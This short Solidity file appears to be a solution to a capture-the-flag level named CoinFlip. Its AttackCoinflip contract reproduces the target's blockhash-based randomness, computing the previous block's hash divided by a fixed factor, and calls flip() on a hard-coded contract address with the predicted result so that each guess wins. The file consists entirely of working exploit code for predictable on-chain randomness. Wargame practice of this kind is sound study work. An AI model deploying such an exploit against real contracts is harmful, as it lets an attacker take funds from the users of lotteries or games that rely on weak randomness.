pragma solidity 0.8.10;

interface ICoinFlip{
    function flip(bool _guess) external returns(bool);
}

contract AttackCoinflip{  
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;		
    address coinflipAddress = 0xbFE43E1FeAc781A7346878B7c6d0Ca891C3A081a;
    ICoinFlip public coinflipContract = ICoinFlip(coinflipAddress);
    function flip() external {
		uint256 blockValue = uint256(blockhash(block.number-1));
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;
        coinflipContract.flip(side);
    }
}